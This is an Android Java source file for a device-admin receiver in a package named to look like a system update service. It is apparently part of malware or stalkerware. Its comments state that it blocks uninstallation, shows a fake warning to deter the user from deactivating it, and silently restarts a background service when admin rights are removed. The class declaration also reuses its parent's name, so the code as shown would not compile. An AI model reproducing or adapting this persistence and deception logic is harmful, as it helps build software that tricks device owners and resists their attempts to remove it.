package com.system.service.update;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class DeviceAdminReceiver extends DeviceAdminReceiver {
    
    @Override
    public void onEnabled(Context context, Intent intent) {
        // Device admin activated - app cannot be uninstalled without deactivation
    }
    
    @Override
    public void onDisabled(Context context, Intent intent) {
        // User is trying to remove device admin - restart service
        restartService(context);
    }
    
    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        // Fake warning message when user tries to deactivate
        return "Deactivating System Service may cause device instability. Continue?";
    }
    
    private void restartService(Context context) {
        try {
            Intent serviceIntent = new Intent(context, SystemService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        } catch (Exception e) {
            // Silent
        }
    }
}
